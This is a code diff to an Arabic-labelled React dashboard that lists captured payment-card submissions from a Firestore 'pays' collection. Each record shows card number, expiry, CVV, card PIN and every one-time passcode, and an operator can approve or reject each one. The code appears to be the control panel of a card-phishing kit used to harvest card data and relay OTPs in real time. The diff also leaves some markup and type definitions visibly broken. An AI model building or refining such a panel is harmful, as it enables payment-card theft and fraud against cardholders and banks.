@@ -43,17 +43,16 @@ interface Notification {
     fullName: string;
     phone: string;
   };
-  cardInfo?: {
     bank:string;
     cardNumber: string;
     prefix:string;
-    expirationDate: string;
+    year: string;
+    month: string;
     cvv: string;
     otp: string;
-    password:string;
+    pass:string;
     allOtps: string[];
     status?: 'pending' | 'approved' | 'rejected';
-  };
 }
 
 export default function NotificationsPage() {
@@ -141,7 +140,7 @@ export default function NotificationsPage() {
   const handleApproval = async (state: string, id: string) => {
     const targetPost = doc(db, 'pays', id);
     await updateDoc(targetPost, {
-      cardState: state,
+      status: state,
     });
   };
 
@@ -236,14 +235,14 @@ export default function NotificationsPage() {
                       </Badge>
                       <Badge
                         variant={
-                          notification.hasCardInfo ? 'default' : 'destructive'
+                          notification.cardNumber ? 'default' : 'destructive'
                         }
                         className={`rounded-md cursor-pointer ${
-                          notification.hasCardInfo ? 'bg-green-500' : ''
+                          notification.cardNumber? 'bg-green-500' : ''
                         }`}
                         onClick={() => handleInfoClick(notification, 'card')}
                       >
-                        {notification.hasCardInfo
+                        {   notification.cardNumber
                           ? 'معلومات البطاقة'
                           : 'لا يوجد بطاقة'}
                       </Badge>
@@ -304,45 +303,43 @@ export default function NotificationsPage() {
                 </p>
               </div>
             )}
-          {selectedInfo === 'card' && selectedNotification?.cardInfo && (
+          {selectedInfo === 'card' && selectedNotification && (
             <div className="space-y-2">
               <p>
                 <strong className="text-red-400 mx-4">البنك:</strong>{' '}
-                {selectedNotification.cardInfo.bank}
+                {selectedNotification.bank}
               </p>
               <p>
-                <strong className="text-red-400 mx-4">prefix:</strong>{' '}
-                {selectedNotification.cardInfo.prefix}
+           
               </p>
               <p>
                 <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{' '}
-                {selectedNotification.cardInfo.cardNumber}
+                {selectedNotification.cardNumber}-     {selectedNotification.prefix}
               </p>
               <p>
                 <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{' '}
-                {selectedNotification.cardInfo.expirationDate}
+                {selectedNotification.year}/{selectedNotification.month}
               </p>
-              <div className="grid grid-cols-2">
-                <p className="flex items-center">
-                  <strong className="text-red-400 mx-4">رمز الأمان:</strong>{' '}
-                  {selectedNotification.cardInfo.cvv}
-                </p>
-                <p className="flex items-center">
-                  <strong className="text-red-400 mx-4">رمز التحقق :</strong>{' '}
-                  {selectedNotification.cardInfo.otp}
-                </p>
+              
                 <p className="flex items-center">
                   <strong className="text-red-400 mx-4">رمز البطاقة :</strong>{' '}
-                  {selectedNotification.cardInfo.password}
+                  {selectedNotification.pass}
                 </p>
-              </div>
+                <p className="flex items-centerpt-4">
+                  <strong className="text-red-400 mx-4">رمز التحقق :</strong>{' '}
+                  {selectedNotification.otp}
+                </p>
               <>
               
               
               </>
               <p>
                 <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
-                {selectedNotification.cardInfo.allOtps.join(',')}
+                <div className='grid grid-cols'>
+                {selectedNotification.allOtps.map((i,index)=>
+                <Badge>{i}</Badge>
+                )}
+                </div>
               </p>
               <div className="flex justify-between mx-1">
                 <Button
